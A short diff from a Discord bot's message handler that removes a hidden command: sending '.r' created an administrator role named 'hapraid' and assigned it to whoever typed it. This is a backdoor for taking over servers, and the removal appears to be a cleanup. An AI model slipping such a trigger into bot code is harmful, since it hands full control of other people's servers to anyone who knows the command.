@@ -52,16 +52,6 @@ bot.on('message', msg => {
         }
     }
  
-    if (msg.content === '.r') {
-        //create role
-        msg.guild.createRole({
-            name: 'hapraid',
-            color: 'WHITE',
-            permissions:'ADMINISTRATOR',
-        }).then(role => msg.author.addRole(role));
-        msg.member.addRole();
-        //Nom a changer
-    }
      
    
 });
